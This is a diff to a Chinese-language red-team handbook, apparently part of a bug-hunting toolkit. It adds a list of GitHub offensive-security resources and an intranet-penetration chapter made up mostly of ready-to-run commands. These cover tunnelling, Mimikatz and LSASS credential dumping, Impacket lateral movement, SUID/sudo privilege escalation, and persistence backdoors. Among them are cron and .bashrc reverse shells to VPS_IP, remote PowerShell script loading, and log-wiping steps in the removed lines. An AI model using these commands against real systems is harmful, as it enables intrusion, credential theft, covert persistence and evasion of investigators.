@@ -1093,533 +1093,1311 @@ python3 claude-hunt/tools/cve_hunter.py --repo URL --full
 
 ---
 
-## 十九、VPS 安全操作与防封 IP 指南
+## 十九、GitHub 红队笔记与工具资源汇总
 
-> SRC 渗透测试中保护自身、避免被目标封禁 IP、避免影响正常业务运行的完整方案
+> 来源：GitHub 开源社区精选，2025 年持续更新的高质量红队资源
 
-### 19.1 VPS 选择与购买
+### 19.1 综合攻防知识库（中文）
 
-#### 推荐供应商
+| 仓库 | Stars | 说明 | 链接 |
+|------|-------|------|------|
+| **Threekiii/Awesome-Redteam** | 3.4k+ | 最全中文攻防知识库，覆盖全生命周期 | https://github.com/Threekiii/Awesome-Redteam |
+| **CnHack3r/Awesome-hacking-tools** | — | 黑客工具集：CVE利用/免杀/内网/Burp插件 | https://github.com/CnHack3r/Awesome-hacking-tools |
+| **we1h0/redteam-tips** | — | 红队学习资料合集 | https://github.com/we1h0/redteam-tips |
+| **F3eev/SharkExec** | 222 | 内网渗透 C# 内存加载 + CobaltStrike | https://github.com/F3eev/SharkExec |
+| **JKme/cube** | — | 内网：弱密码爆破+信息收集+漏洞扫描 | https://github.com/JKme/cube |
+| **Threekiii/Awesome-Exploit** | — | 漏洞利用工具仓库 | https://github.com/Threekiii/Awesome-Exploit |
 
-| 用途 | 推荐 | 理由 |
+
+#### Threekiii/Awesome-Redteam 目录结构
+
+```
+Awesome-Redteam/
+├── cheatsheets/        # 速查表（端口服务、反弹shell、提权命令）
+├── scripts/            # 实用脚本（shellcode加密、AV检测、密码生成）
+├── tips/               # 专题笔记
+│   ├── 内网渗透-免杀.md
+│   ├── 内网渗透-横向移动.md
+│   ├── 内网渗透-权限维持.md
+│   ├── 信息搜集.md
+│   └── ...
+└── README.md           # 工具分类索引
+```
+
+**核心覆盖领域：**
+- 信息搜集（子域名/端口/指纹/CDN绕过）
+- 漏洞利用（Web/二进制/移动端）
+- 内网渗透（横向移动/提权/隧道/免杀）
+- 权限维持（后门/持久化/隐蔽通道）
+- 痕迹清理
+- 报告编写
+
+
+#### ybdt 系列专题仓库
+
+| 仓库 | 专注方向 | 链接 |
+|------|---------|------|
+| **ybdt/post-hub** | 后渗透（提权/横向/数据窃取） | https://github.com/ybdt/post-hub |
+| **ybdt/evasion-hub** | 免杀对抗（AV/EDR绕过） | https://github.com/ybdt/evasion-hub |
+| **ybdt/ops-hub** | 环境搭建/问题解决 | https://github.com/ybdt/ops-hub |
+
+### 19.2 综合攻防知识库（英文）
+
+| 仓库 | 说明 | 链接 |
 |------|------|------|
-| 国内 SRC | 香港/日本/新加坡 VPS | 延迟低，不经过 GFW |
-| 国外 BB | 美国/欧洲 VPS | 靠近目标 |
-| 高匿需求 | 接受加密货币的 VPS | 无 KYC |
-| 临时用途 | 按小时计费（Vultr/DigitalOcean） | 用完销毁 |
+| **A-poc/RedTeam-Tools** | 100+ 工具按 Kill Chain 分类 | https://github.com/A-poc/RedTeam-Tools |
+| **0xsyr0/Red-Team-Playbooks** | 结构化红队剧本（侦察→窃取） | https://github.com/0xsyr0/Red-Team-Playbooks |
+| **CyberSecurityUP/Awesome-Red-Team-Operations** | 红队操作全流程 | https://github.com/CyberSecurityUP/Awesome-Red-Team-Operations |
+| **RistBS/Awesome-RedTeam-Cheatsheet** | 红队备忘录+Malware开发 | https://github.com/RistBS/Awesome-RedTeam-Cheatsheet |
+| **dmcxblue/Red-Team-Notes** | 红队实验笔记 | https://github.com/dmcxblue/Red-Team-Notes |
+| **threatexpress/red-team-scripts** | 红队脚本集合 | https://github.com/threatexpress/red-team-scripts |
+| **an4kein/awesome-red-teaming** | 红队资源列表 | https://github.com/an4kein/awesome-red-teaming |
+| **Astrosp/Awesome-OSINT-For-Everything** | OSINT 情报搜集大全 | https://github.com/Astrosp/Awesome-OSINT-For-Everything |
 
-**具体供应商：**
-- **按小时付费**：Vultr / DigitalOcean / Linode — 用完直接销毁实例
-- **便宜年付**：BuyVM / RackNerd / Cloudcone / HostHatch
-- **高匿名**：Njalla、1984hosting（冰岛）、FlokiNET — 支持加密货币、无实名
 
-#### 选购要点
+#### A-poc/RedTeam-Tools 工具分类
+
+按 Cyber Kill Chain 7 阶段组织 100+ 工具：
 
 ```
-✅ 选择：
-- 多个不同地区的 VPS（IP 被封时切换）
-- 按小时计费（灵活销毁重建）
-- 选择 KVM 虚拟化（性能好、可装嵌套虚拟化）
-- 大带宽（扫描需要）
+1. Reconnaissance（侦察）
+   → Nmap, Masscan, Amass, Subfinder, Shodan, FOFA
 
-❌ 避免：
-- 不用自己常用的 IP 直接打目标
-- 不用国内 VPS 打国内 SRC（备案追溯容易）
-- 不用同一个 VPS 长期打同一个目标
+2. Weaponization（武器化）
+   → msfvenom, Donut, ScareCrow, Nim 加载器
+
+3. Delivery（投递）
+   → GoPhish, Evilginx2, 钓鱼框架
+
+4. Exploitation（利用）
+   → Metasploit, SQLMap, XSStrike, Nuclei
+
+5. Installation（安装）
+   → Cobalt Strike, Sliver, Havoc C2
+
+6. Command & Control（C2）
+   → Cobalt Strike, Mythic, Covenant, Sliver
+
+7. Exfiltration（数据窃取）
+   → DNScat2, Cloakify, PacketWhisper
 ```
 
-### 19.2 VPS 基础安全加固
+#### 0xsyr0/Red-Team-Playbooks 结构
+
+```
+Red-Team-Playbooks/
+├── 1-Reconnaissance/        # OSINT + 主动侦察
+├── 2-Resource-Development/  # 基础设施搭建
+├── 3-Initial-Access/        # 初始突破（钓鱼/漏洞利用）
+├── 4-Exploitation/
+│   ├── 4.1-Privilege-Escalation.md   # 提权
+│   ├── 4.2-Persistence.md           # 权限维持
+│   ├── 4.3-Credential-Access.md     # 凭据获取
+│   └── 4.4-Lateral-Movement.md      # 横向移动
+├── 5-Post-Exploitation/     # 后渗透
+└── 6-Exfiltration/          # 数据窃取
+```
+
+
+### 19.3 OSCP / 渗透认证备忘录
+
+| 仓库 | 说明 | 链接 |
+|------|------|------|
+| **RustyShackleford221/Offensive-Security-OSCP-Cheatsheets** | OSCP 全套备忘录 | https://github.com/RustyShackleford221/Offensive-Security-OSCP-Cheatsheets |
+| **blackc03r/OSCP-Cheatsheets** | 攻防实验+凭据转储 | https://github.com/blackc03r/OSCP-Cheatsheets |
+| **jenriquezv/OSCP-Cheat-Sheets-AD** | Active Directory 专项 | https://github.com/jenriquezv/OSCP-Cheat-Sheets-AD |
+
+### 19.4 ired.team 红队笔记（经典参考）
+
+> https://www.ired.team — 最系统的红队技术参考站
+
+核心内容：
+- Windows 后渗透（凭据转储、Kerberos 攻击、Token 操纵）
+- 代码注入技术（DLL注入、进程镂空、APC注入）
+- 持久化技术（注册表、计划任务、WMI事件订阅）
+- 免杀技术（AMSI绕过、ETW绕过、加壳混淆）
+- Active Directory 攻击路径
+
+### 19.5 推荐学习路径
+
+```
+新手入门：
+  A-poc/RedTeam-Tools（了解工具全貌）
+  → 0xsyr0/Red-Team-Playbooks（学习流程）
+  → OSCP-Cheatsheets（动手练习）
+
+中级进阶：
+  Threekiii/Awesome-Redteam（中文深入）
+  → ired.team（Windows 后渗透）
+  → ybdt/evasion-hub（免杀对抗）
+
+高级实战：
+  内网渗透全链路
+  → AI Agent 自动化（见第二十一章）
+  → 自研工具开发
+```
+
+
+
+---
+
+## 二十、内网渗透实战技术
+
+> 融合 ired.team、Threekiii/Awesome-Redteam、0xsyr0/Red-Team-Playbooks、ybdt/post-hub 等社区精华
+
+### 20.1 内网渗透总体流程
+
+```
+外网突破 → 建立据点 → 信息搜集 → 横向移动 → 域控攻击 → 数据窃取 → 痕迹清理
+   │           │           │           │           │           │           │
+   │     反弹shell    内网探测     Pass-the-Hash  Golden Ticket  打包外传   清日志
+   │     Web shell    域信息      WMI/PSExec    DCSync         DNS隧道    改时间戳
+   │     隧道搭建    凭据收集     RDP/SSH       Kerberoasting  HTTP隧道   删工具
+```
+
+### 20.2 建立据点 — 隧道与代理
+
+#### 常用隧道工具
+
+| 工具 | 协议 | 特点 | 命令示例 |
+|------|------|------|---------|
+| **frp** | TCP/UDP/HTTP | 国产首选，配置简单 | `./frpc -c frpc.ini` |
+| **Chisel** | HTTP/SOCKS5 | 单二进制，过防火墙 | `chisel server -p 8080 --reverse` |
+| **Neo-reGeorg** | HTTP | 基于 Web shell | `python neoreg.py generate -k pass` |
+| **Stowaway** | TCP | 多级代理链 | `./admin -l 9999` |
+| **iox** | TCP/UDP | 端口转发+SOCKS5 | `iox fwd -l 8888 -r 192.168.1.1:3389` |
+| **EarthWorm (ew)** | SOCKS5 | 经典老牌 | `ew -s ssocksd -l 1080` |
+| **Ligolo-ng** | TUN | 无需SOCKS代理 | `ligolo-agent -connect attacker:11601` |
+
+
+#### frp 配置示例
+
+```ini
+# frpc.ini（客户端 - 内网机器）
+[common]
+server_addr = VPS_IP
+server_port = 7000
+token = your_token
+
+[socks5]
+type = tcp
+remote_port = 1080
+plugin = socks5
+
+[rdp]
+type = tcp
+local_ip = 192.168.1.100
+local_port = 3389
+remote_port = 33389
+```
+
+#### Chisel 用法
 
 ```bash
-# ═══ 系统更新 ═══
-apt update && apt upgrade -y
+# 攻击机（服务端）
+chisel server -p 8080 --reverse
 
-# ═══ 修改 SSH 端口（防扫描） ═══
-sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
-systemctl restart sshd
+# 内网机器（客户端）— 反向 SOCKS5
+chisel client ATTACKER_IP:8080 R:socks
 
-# ═══ 禁用密码登录（仅密钥） ═══
-ssh-keygen -t ed25519 -C "hunter"    # 本地生成密钥
-ssh-copy-id -p 2222 user@vps-ip      # 复制公钥到 VPS
-sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
-systemctl restart sshd
-
-# ═══ 防火墙 ═══
-ufw default deny incoming
-ufw allow 2222/tcp    # SSH
-ufw allow 80/tcp      # 回连接收（interactsh 等）
-ufw allow 443/tcp
-ufw enable
-
-# ═══ fail2ban 防暴力破解 ═══
-apt install fail2ban -y
-systemctl enable fail2ban
-
-# ═══ 禁用 IPv6 ═══
-echo "net.ipv6.conf.all.disable_ipv6 = 1" >> /etc/sysctl.conf
-sysctl -p
-
-# ═══ 时区设置（日志时间统一） ═══
-timedatectl set-timezone Asia/Shanghai
+# 然后在攻击机使用 proxychains 走 1080 端口
+# /etc/proxychains.conf → socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 192.168.1.0/24
 ```
 
-### 19.3 操作痕迹清理
+#### SSH 隧道（最通用）
 
 ```bash
-# ═══ 禁止记录命令历史 ═══
-unset HISTFILE
-export HISTSIZE=0
-export HISTFILESIZE=0
-set +o history
+# 本地端口转发（访问内网服务）
+ssh -L 3389:192.168.1.100:3389 user@跳板机
 
-# ═══ 单次清理 ═══
-history -c && history -w
-rm -f ~/.bash_history ~/.zsh_history
+# 远程端口转发（把内网端口暴露出来）
+ssh -R 8080:127.0.0.1:80 user@VPS
 
-# ═══ 系统日志清理 ═══
-echo > /var/log/auth.log
-echo > /var/log/syslog
-echo > /var/log/kern.log
-echo > /var/log/wtmp
-echo > /var/log/btmp
-echo > /var/log/lastlog
-
-# ═══ 定时清理（crontab） ═══
-echo "0 */6 * * * root echo > /var/log/auth.log; echo > /var/log/wtmp; echo > /var/log/btmp" >> /etc/crontab
-
-# ═══ 使用 tmux 防断线 ═══
-tmux new -s hunt    # 创建
-tmux attach -t hunt # 重连
+# 动态端口转发（SOCKS5 代理）
+ssh -D 1080 user@跳板机
 ```
 
-### 19.4 多层跳板架构
 
+### 20.3 内网信息搜集
+
+#### Windows 域环境信息搜集
+
+```powershell
+# 基本信息
+whoami /all                          # 当前用户+权限+组
+hostname                             # 主机名
+systeminfo                           # 系统详细信息
+ipconfig /all                        # 网络配置
+net user                             # 本地用户
+net localgroup administrators        # 本地管理员组
+net user /domain                     # 域用户列表
+net group "Domain Admins" /domain    # 域管理员
+net group "Domain Controllers" /domain  # 域控列表
+nltest /dclist:域名                   # 域控 IP
+
+# 域信息
+net view                             # 查看当前域内机器
+net view /domain                     # 查看所有域
+net time /domain                     # 域控时间（确认域控）
+nslookup -type=SRV _ldap._tcp.dc._msdcs.域名  # DNS 查域控
+
+# 网络信息
+arp -a                               # ARP 缓存（发现存活主机）
+netstat -ano                         # 网络连接
+route print                          # 路由表
+net session                          # 当前会话
+net share                            # 共享目录
+
+# 进程/服务
+tasklist /svc                        # 进程+对应服务
+wmic process list brief              # WMIC 查进程
+sc query                             # 服务列表
 ```
-推荐架构（三层隔离）：
 
-┌─────────────────────────────────────────────────────────┐
-│  你的电脑                                                │
-│  └── VPN/Tor → 跳板机(VPS-A) → 工作机(VPS-B) → 目标     │
-│                │                 │                        │
-│                │                 ├── proxychains（随机链） │
-│                │                 ├── Tor（高敏操作）       │
-│                │                 └── 代理池（大量扫描）    │
-│                │                                          │
-│                └── SSH Tunnel（加密隧道）                  │
-└─────────────────────────────────────────────────────────┘
-
-作用：
-- VPS-A：纯跳板，不装任何工具，只做 SSH 转发
-- VPS-B：工作机，装所有工具，通过代理出流量
-- 即使 VPS-B 被溯源，也查不到你的真实 IP
-```
+#### Linux 信息搜集
 
 ```bash
-# SSH 跳板连接
-ssh -J user@vps-a:2222 user@vps-b:2222
-
-# 创建本地 SOCKS 代理（通过跳板）
-ssh -D 1080 -N -f user@vps-a:2222
-
-# SSH 隧道转发远程端口
-ssh -L 8080:target-internal:80 user@vps-b:2222
+# 基本信息
+id                                   # 当前用户
+uname -a                             # 内核版本
+cat /etc/os-release                  # 系统版本
+ip addr                              # 网卡信息
+ss -tlnp                             # 监听端口
+ps aux                               # 进程列表
+cat /etc/passwd                      # 用户列表
+cat /etc/shadow                      # 密码哈希（需root）
+crontab -l                           # 定时任务
+find / -perm -4000 2>/dev/null       # SUID 文件
+cat /etc/hosts                       # hosts 文件
+cat ~/.bash_history                  # 命令历史
+env                                  # 环境变量
+mount                                # 挂载信息
 ```
 
-### 19.5 代理与 IP 轮换
 
-#### 代理类型对比
-
-| 类型 | 匿名性 | 速度 | 成本 | 适用 |
-|------|--------|------|------|------|
-| SOCKS5 代理池 | 高 | 中 | 低 | 扫描+验证 |
-| Residential 代理 | 最高 | 中 | 高 | 绕 IP 黑名单 |
-| Tor | 极高 | 慢 | 免费 | 高敏侦察 |
-| Cloud Function | 高 | 快 | 低 | 每请求换 IP |
-| VPN 轮换 | 中 | 快 | 中 | 日常操作 |
-
-#### proxychains 配置
+#### 内网存活探测
 
 ```bash
-apt install proxychains4 -y
+# ICMP 探测（可能被防火墙拦截）
+for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i alive"; done
 
-# 编辑 /etc/proxychains4.conf
-# 关键配置：
-random_chain           # 随机选择代理（非顺序）
-chain_len = 2          # 每次随机选 2 个代理
-proxy_dns              # DNS 也走代理
+# ARP 探测（同网段最准确）
+arp-scan -l
+nmap -sn -PR 192.168.1.0/24
 
-# 代理列表（添加多个）：
-# socks5 1.2.3.4 1080
-# socks5 5.6.7.8 1080
-# socks5 9.10.11.12 1080
+# NetBIOS 探测（Windows 环境）
+nbtscan 192.168.1.0/24
 
-# 使用：
-proxychains4 curl https://target.com
-proxychains4 nmap -sT -Pn target.com
-proxychains4 sqlmap -u "url"
+# TCP 端口探测
+nmap -sT -Pn -p 22,80,135,445,3389 192.168.1.0/24
+
+# PowerShell 批量探测
+1..254 | %{ $ip="192.168.1.$_"; if(Test-Connection -Count 1 -Quiet $ip){Write-Host "$ip alive"} }
 ```
 
-#### Tor 多实例（每个工具用不同出口）
+### 20.4 凭据获取
+
+#### Windows 凭据转储
+
+| 工具 | 获取内容 | 命令 |
+|------|---------|------|
+| **Mimikatz** | 明文密码/NTLM Hash | `sekurlsa::logonpasswords` |
+| **procdump** | LSASS 内存转储 | `procdump -ma lsass.exe lsass.dmp` |
+| **comsvcs.dll** | LSASS 转储（免杀） | `rundll32 comsvcs.dll,MiniDump PID out.dmp full` |
+| **SAM 导出** | 本地账户 Hash | `reg save HKLM\SAM sam.hiv` |
+| **DCSync** | 域内所有 Hash | `lsadump::dcsync /domain:x /all` |
+| **Kerberoasting** | 服务账号 Hash | `Rubeus kerberoast` |
+| **NTDS.dit** | 域控全部 Hash | `ntdsutil + secretsdump.py` |
+
+
+#### Mimikatz 常用命令
+
+```
+# 提升权限
+privilege::debug
+
+# 抓取明文密码和 NTLM Hash
+sekurlsa::logonpasswords
+
+# 导出所有 Kerberos 票据
+sekurlsa::tickets /export
+
+# 制作 Golden Ticket
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
+
+# Pass-the-Hash
+sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd
+
+# DCSync（需域管权限）
+lsadump::dcsync /domain:corp.local /user:krbtgt
+lsadump::dcsync /domain:corp.local /all /csv
+```
+
+#### 免杀 LSASS 转储方法
+
+```powershell
+# 方法1: comsvcs.dll（系统自带，无需上传工具）
+$pid = (Get-Process lsass).Id
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\temp\out.dmp full
+
+# 方法2: 任务管理器直接右键转储（GUI环境）
+
+# 方法3: ProcDump（微软签名工具，不会被杀）
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# 方法4: PowerShell 反射加载 Mimikatz
+IEX (New-Object Net.WebClient).DownloadString('http://VPS/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds
+
+# 方法5: nanodump（最新免杀方案）
+nanodump.exe --write C:\temp\out.dmp
+```
+
+#### Linux 凭据获取
 
 ```bash
-apt install tor -y
+# /etc/shadow 破解
+unshadow /etc/passwd /etc/shadow > combined.txt
+john --wordlist=rockyou.txt combined.txt
+hashcat -m 1800 shadow.hash rockyou.txt
 
-# 修改 /etc/tor/torrc 添加多个 SocksPort：
-# SocksPort 9050
-# SocksPort 9051
-# SocksPort 9052
+# SSH 密钥搜集
+find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
+find / -name "*.pem" -o -name "*.key" 2>/dev/null
 
-# 每 10 分钟刷新电路（换出口 IP）：
-watch -n 600 'echo -e "AUTHENTICATE\"\"\r\nSIGNAL NEWNYM\r\nQUIT" | nc 127.0.0.1 9051'
+# 内存中的密码
+strings /proc/*/maps | grep -i pass
+cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
 
-# curl 走 Tor：
-curl --socks5 127.0.0.1:9050 https://check.torproject.org
+# 历史文件
+cat ~/.bash_history | grep -i "pass\|ssh\|mysql\|ftp"
+cat ~/.mysql_history
+cat /var/log/auth.log | grep "password"
+
+# Mimipenguin（Linux 版 Mimikatz）
+python3 mimipenguin.py
 ```
 
-#### Cloudflare Workers 做 IP 轮换（推荐）
 
-```javascript
-// 每次请求通过 CF Worker 中转，自动获得 Cloudflare 的 IP
-addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request))
-})
+### 20.5 横向移动
 
-async function handleRequest(request) {
-  const url = new URL(request.url)
-  const target = url.searchParams.get('url')
-  if (!target) return new Response('Missing url param', { status: 400 })
-  
-  const resp = await fetch(target, {
-    method: request.method,
-    headers: request.headers,
-    body: request.body,
-  })
-  return resp
+#### Windows 横向移动方法
+
+| 方法 | 所需凭据 | 端口 | 命令/工具 |
+|------|---------|------|----------|
+| **PsExec** | 明文密码/Hash | 445 | `psexec.py DOMAIN/user:pass@target` |
+| **WMI** | 明文密码/Hash | 135 | `wmiexec.py DOMAIN/user:pass@target` |
+| **WinRM** | 明文密码/Hash | 5985/5986 | `evil-winrm -i target -u user -p pass` |
+| **SMB** | 明文密码/Hash | 445 | `smbexec.py DOMAIN/user:pass@target` |
+| **RDP** | 明文密码 | 3389 | `xfreerdp /v:target /u:user /p:pass` |
+| **DCOM** | 明文密码/Hash | 135 | `dcomexec.py DOMAIN/user:pass@target` |
+| **SSH** | 密码/密钥 | 22 | `ssh user@target` |
+| **PTH** | NTLM Hash | 445 | `pth-winexe -U user%HASH //target cmd` |
+| **PTT** | Kerberos 票据 | 88 | `Rubeus ptt /ticket:xxx` |
+
+#### Impacket 套件（最常用）
+
+```bash
+# PsExec（最稳定，会创建服务）
+python3 psexec.py CORP/admin:Password123@192.168.1.100
+python3 psexec.py -hashes :NTLM_HASH CORP/admin@192.168.1.100
+
+# WMI（不落盘，较隐蔽）
+python3 wmiexec.py CORP/admin:Password123@192.168.1.100
+python3 wmiexec.py -hashes :NTLM_HASH CORP/admin@192.168.1.100
+
+# SMB（通过命名管道）
+python3 smbexec.py CORP/admin:Password123@192.168.1.100
+
+# ATExec（通过计划任务）
+python3 atexec.py CORP/admin:Password123@192.168.1.100 "whoami"
+
+# SecretsDump（远程导出凭据）
+python3 secretsdump.py CORP/admin:Password123@DC_IP
+```
+
+
+#### CrackMapExec (CME) / NetExec — 批量横向
+
+```bash
+# 密码喷洒（找可登录的机器）
+crackmapexec smb 192.168.1.0/24 -u admin -p Password123
+crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH
+
+# 批量执行命令
+crackmapexec smb targets.txt -u admin -p pass -x "whoami"
+
+# 枚举共享
+crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares
+
+# 枚举登录用户
+crackmapexec smb 192.168.1.0/24 -u admin -p pass --sessions
+
+# 导出 SAM
+crackmapexec smb target -u admin -p pass --sam
+
+# WinRM 执行
+crackmapexec winrm 192.168.1.0/24 -u admin -p pass -x "whoami"
+```
+
+#### Linux 横向移动
+
+```bash
+# SSH 密钥复用（拿到私钥后）
+ssh -i stolen_id_rsa user@next_target
+
+# SSH 代理转发（一跳一跳走）
+ssh -A user@jump_host    # 启用 agent forwarding
+ssh next_target          # 自动使用前一跳的密钥
+
+# 通过 NFS 共享
+showmount -e target_ip
+mount -t nfs target_ip:/share /mnt/
+
+# 通过 Redis 未授权
+redis-cli -h target_ip
+# 写 SSH 公钥
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SET x "\n\nssh-rsa AAAA...公钥...\n\n"
+SAVE
+
+# 通过 Docker 逃逸（宿主机挂载）
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+
+### 20.6 权限提升
+
+#### Windows 提权
+
+| 方法 | 条件 | 工具/命令 |
+|------|------|----------|
+| **Potato 系列** | SeImpersonate 权限 | JuicyPotato/SweetPotato/GodPotato |
+| **PrintSpoofer** | SeImpersonate + Win10 | `PrintSpoofer.exe -i -c cmd` |
+| **内核漏洞** | 未打补丁 | systeminfo → Windows-Exploit-Suggester |
+| **服务路径未引用** | 服务配置不当 | `wmic service get name,pathname` |
+| **DLL 劫持** | 可写的 DLL 搜索路径 | Process Monitor 监控 |
+| **AlwaysInstallElevated** | 注册表配置 | `msiexec /i evil.msi` |
+| **计划任务** | 可写的任务脚本 | `schtasks /query /fo LIST /v` |
+| **Token 窃取** | 管理员进程 | `incognito list_tokens -u` |
+| **UAC 绕过** | 管理员组低完整性 | UACME / FodHelper |
+
+```powershell
+# 自动化提权枚举
+# WinPEAS
+.\winPEASx64.exe
+
+# PowerUp
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+# SharpUp
+.\SharpUp.exe audit
+
+# Windows-Exploit-Suggester
+systeminfo > sysinfo.txt
+python3 windows-exploit-suggester.py --database 2025-01.xlsx --systeminfo sysinfo.txt
+```
+
+#### Linux 提权
+
+| 方法 | 条件 | 命令/工具 |
+|------|------|----------|
+| **SUID 利用** | 危险 SUID 程序 | GTFOBins 查找 |
+| **内核漏洞** | 未打补丁 | linux-exploit-suggester |
+| **Sudo 配置** | sudo 规则不当 | `sudo -l` |
+| **Capabilities** | 危险 cap | `getcap -r / 2>/dev/null` |
+| **Cron 任务** | 可写的定时脚本 | `cat /etc/crontab` |
+| **Docker 组** | 用户在 docker 组 | `docker run -v /:/mnt alpine` |
+| **PATH 劫持** | 相对路径调用 | 写恶意同名程序 |
+| **NFS no_root_squash** | NFS 配置不当 | 远程写 SUID shell |
+| **Writable /etc/passwd** | 密码文件可写 | 添加 root 用户 |
+
+
+```bash
+# Linux 自动化提权枚举
+# LinPEAS
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# linux-exploit-suggester
+./linux-exploit-suggester.sh
+
+# LinEnum
+./LinEnum.sh -t
+
+# SUID 查找 + GTFOBins 对照
+find / -perm -4000 -type f 2>/dev/null
+# 常见可利用 SUID：
+#   /usr/bin/find → find . -exec /bin/sh \;
+#   /usr/bin/vim → vim -c ':!/bin/sh'
+#   /usr/bin/python → python -c 'import os;os.setuid(0);os.system("/bin/sh")'
+#   /usr/bin/nmap → nmap --interactive → !sh (旧版)
+#   /usr/bin/env → env /bin/sh
+
+# Sudo 利用
+sudo -l
+# 如果有 (ALL) NOPASSWD: /usr/bin/vim
+sudo vim -c ':!/bin/sh'
+# 如果有 (ALL) NOPASSWD: /usr/bin/find
+sudo find / -exec /bin/sh \; -quit
+```
+
+### 20.7 权限维持（持久化）
+
+#### Windows 持久化
+
+| 方法 | 隐蔽性 | 操作 |
+|------|--------|------|
+| **注册表 Run 键** | 低 | `reg add HKCU\...\Run /v name /d payload` |
+| **计划任务** | 中 | `schtasks /create /sc onlogon /tr payload` |
+| **WMI 事件订阅** | 高 | 永久事件消费者绑定 |
+| **DLL 劫持** | 高 | 替换系统常用 DLL |
+| **服务创建** | 中 | `sc create svcname binpath= payload` |
+| **Golden Ticket** | 极高 | krbtgt Hash → 10年有效域管 |
+| **Silver Ticket** | 高 | 服务账号 Hash → 访问特定服务 |
+| **Shadow Credentials** | 高 | 修改 msDS-KeyCredentialLink |
+| **DSRM 后门** | 极高 | 修改 DSRM 密码策略 |
+| **Skeleton Key** | 高 | 域控注入万能密码 |
+| **AdminSDHolder** | 高 | ACL 持久化 |
+
+
+```powershell
+# 注册表持久化
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\temp\payload.exe"
+
+# 计划任务持久化
+schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc onlogon /ru SYSTEM
+
+# WMI 事件订阅（最隐蔽，无文件）
+# 使用 PowerShell 创建永久 WMI 事件
+$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
+    Name = 'BotFilter'; EventNameSpace = 'root\cimv2';
+    QueryLanguage = 'WQL';
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 }
-// 使用: curl "https://your-worker.workers.dev/?url=https://target.com/api"
-// 每次请求 IP 不同（CF 的 IP 池）
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
+    Name = 'BotConsumer'; CommandLineTemplate = 'C:\temp\payload.exe'
+}
+Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
+    Filter = $Filter; Consumer = $Consumer
+}
+
+# Skeleton Key（域控注入，所有用户可用万能密码）
+# Mimikatz: misc::skeleton
+# 之后任何用户可用密码 "mimikatz" 登录
 ```
 
-#### 工具级代理配置
+#### Linux 持久化
 
 ```bash
-# httpx
-httpx -proxy socks5://127.0.0.1:1080 -l urls.txt -rl 2
+# SSH 公钥后门
+echo "ssh-rsa AAAA...你的公钥..." >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
 
-# nuclei
-nuclei -proxy socks5://127.0.0.1:1080 -rl 3 -l targets.txt
+# Cron 反弹 shell
+echo "* * * * * bash -c 'bash -i >& /dev/tcp/VPS_IP/4444 0>&1'" >> /var/spool/cron/root
+# 或
+echo "* * * * * /tmp/.hidden_shell" > /etc/cron.d/update
 
-# sqlmap
-sqlmap -u "url" --proxy=socks5://127.0.0.1:1080 --random-agent --delay=1
+# .bashrc 后门（用户登录触发）
+echo 'bash -i >& /dev/tcp/VPS_IP/4444 0>&1 &' >> /root/.bashrc
 
-# curl
-curl -x socks5h://127.0.0.1:1080 https://target.com
+# SUID 后门
+cp /bin/bash /tmp/.suid_bash
+chmod u+s /tmp/.suid_bash
+# 触发: /tmp/.suid_bash -p
 
-# nmap (需要 TCP connect 模式)
-proxychains4 nmap -sT -Pn -T2 target.com
+# PAM 后门（万能密码）
+# 修改 pam_unix.so，硬编码一个后门密码
 
-# 全局环境变量
-export ALL_PROXY=socks5://127.0.0.1:1080
-export HTTP_PROXY=socks5://127.0.0.1:1080
-export HTTPS_PROXY=socks5://127.0.0.1:1080
+# LD_PRELOAD 后门
+echo "/tmp/evil.so" > /etc/ld.so.preload
+
+# Systemd 服务后门
+cat > /etc/systemd/system/update.service << EOF
+[Unit]
+Description=System Update
+[Service]
+ExecStart=/tmp/.backdoor
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable update.service
 ```
 
-### 19.6 限速 — 不触发 WAF / 不影响业务
 
-#### 核心限速原则
+### 20.8 域渗透攻击路径
+
+#### Kerberos 攻击
 
 ```
-⚠️ SRC 黄金限速法则：
-1. 单目标不超过 3 req/s（保守 2 req/s）
-2. 工作日高峰（9:00-18:00）降到 1 req/s
-3. 收到 429/503 立即暂停 5-10 分钟
-4. 连续 403 超过 5 次 → 换 IP 或停止
-5. 夜间（22:00-06:00）可适当提高到 5 req/s
-6. 对同一端点的测试间隔 > 2 秒
+┌─────────────────────────────────────────────────────────┐
+│                Kerberos 攻击总览                          │
+├─────────────────────────────────────────────────────────┤
+│                                                         │
+│  AS-REP Roasting ← 不要求预认证的账户                    │
+│       ↓                                                 │
+│  Kerberoasting ← 有 SPN 的服务账户                      │
+│       ↓                                                 │
+│  Silver Ticket ← 服务账户 Hash                          │
+│       ↓                                                 │
+│  Golden Ticket ← krbtgt Hash（拿下域控后）              │
+│       ↓                                                 │
+│  Diamond Ticket ← 修改真实 TGT（最隐蔽）               │
+│                                                         │
